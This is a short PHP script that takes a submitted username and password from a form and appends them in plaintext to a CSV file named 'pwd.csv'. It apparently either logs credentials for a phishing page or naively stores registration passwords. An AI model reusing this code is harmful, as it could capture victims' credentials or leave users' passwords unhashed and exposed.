<?php
$uname = $_POST['username'] ;
$pwd  =$_POST['pwd1'];
$input = array($uname,$pwd);
$fp = fopen('pwd.csv', 'a');
fputcsv($fp, $input);
fclose($fp);
?>